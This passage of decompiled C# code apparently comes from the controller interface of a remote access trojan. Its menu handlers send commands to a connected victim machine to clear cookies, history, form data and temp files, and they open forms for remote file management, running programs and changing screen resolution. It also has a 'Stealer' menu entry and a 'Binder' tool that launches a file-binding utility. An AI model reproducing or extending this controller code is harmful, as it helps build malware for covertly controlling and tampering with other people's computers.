      else
        this.PostData((object) (this.Label1.Text + "|clearcookies|"));
    }

    private void HistoryToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|clearhistory|"));
    }

    private void FormDataToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|clearformdata|"));
    }

    private void TempFilesToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|cleartempdata|"));
    }

    private void ResponseToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.response.Show();
    }

    private void ToolStripMenuItem3_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.filem.Show();
    }

    private void RenameFileToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.rename.Show();
    }

    private void ToolStripMenuItem4_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.runit.Show();
    }

    private void ToolStripMenuItem5_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.resolutionchange.Show();
    }

    private void menubar_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
    {
    }

    private void UpdateToolStripMenuItem_Click(object sender, EventArgs e) => MyProject.Forms.UpdateF.Show();

    private void ListView1_SelectedIndexChanged(object sender, EventArgs e)
    {
    }

    private void StealerToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void notify_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
    {
    }

    private void BinderToolStripMenuItem_Click(object sender, EventArgs e) => Interaction.Shell(Application.StartupPath + "/extra/Binder/Unlimited File Downloader.exe", AppWinStyle.NormalFocus);
  }
}
